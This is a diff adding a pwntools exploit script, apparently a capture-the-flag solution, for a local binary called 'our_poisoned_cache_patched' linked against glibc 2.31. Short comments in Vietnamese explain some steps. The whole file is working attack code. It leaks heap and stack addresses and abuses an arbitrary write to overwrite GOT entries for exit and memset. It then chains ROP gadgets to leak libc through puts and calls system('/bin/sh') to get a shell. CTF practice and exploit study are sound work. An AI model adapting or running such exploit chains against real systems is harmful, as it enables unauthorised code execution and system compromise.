@@ -1,0 +1,84 @@
+from pwn import *
+
+e = ELF("./our_poisoned_cache_patched")
+libc = ELF("./libc6_2.31-0ubuntu9.7_amd64.so")
+ld = ELF("./ld-2.31.so")
+
+script = '''
+b *main + 0xD
+b *main + 0x16F
+'''
+#p = gdb.debug("./our_poisoned_cache_patched", gdbscript = script)
+p = process("./our_poisoned_cache_patched")
+
+def leak():
+    p.recvuntil(b"is: ")
+    heap_base = int(p.recvline(), 16)
+    p.recvuntil(b"is: ")
+    stack_addr = int(p.recvline(), 16)
+    return (heap_base, stack_addr)
+
+def overwrite(target, data):
+    p.sendlineafter(b"Where:", f"{hex(heap_base + 0xa0 + 8)}".encode())
+    p.sendlineafter(b"What:", f"{hex(target)}".encode())
+    p.send(data)
+
+def clear_tcache(n): # de chuong trinh k bi crash
+    p.sendlineafter(b"Where:", f"{hex(heap_base + 0x310 + n * 0xe0)}".encode())
+    p.sendlineafter(b"What:", f"0".encode())
+    p.send(b"\x00" * 8)
+
+# exit -> main
+(heap_base, stack_addr) = leak()
+exit_got = e.got['exit']
+main = e.symbols['main']
+overwrite(exit_got, p64(main))
+clear_tcache(0)
+
+# memset -> main + 0x12
+memset_got = e.got['memset']
+overwrite(memset_got, p64(main + 0x12))
+clear_tcache(1)
+
+# exit -> call_memset
+call_memset = 0x40126D
+overwrite(exit_got, p64(call_memset))
+clear_tcache(2)
+
+# ROP
+pop_rdi = 0x00000000004014ab
+ret = pop_rdi + 1
+puts_got = e.got['puts']
+puts_plt = e.plt['puts']
+
+(heap_base, stack_addr) = leak()
+overwrite(stack_addr + 0x38, p64(pop_rdi) + p64(puts_got) + p64(ret) + p64(puts_plt) + p64(ret) + p64(main))
+clear_tcache(3)
+overwrite(stack_addr + 0x68, p64(ret) + p64(main))
+clear_tcache(4)
+
+# exit -> leave, ret;
+leave_ret = 0x00000000004012c5
+overwrite(exit_got, p64(leave_ret))
+
+p.recv(1) # b"\n" tu sau b"What:"
+libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x84450
+print(hex(libc_base))
+one_shot = libc_base + 0xe3b31
+
+# exit -> call_memset 
+clear_tcache(5) # tac dung phu cua ROP
+overwrite(exit_got, p64(call_memset))
+clear_tcache(6)
+
+# ROP lan 2
+(heap_base, stack_addr) = leak()
+system = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+overwrite(stack_addr + 0x38, p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))
+clear_tcache(7)
+
+# exit -> leave, ret;
+overwrite(exit_got, p64(leave_ret))
+
+p.interactive()
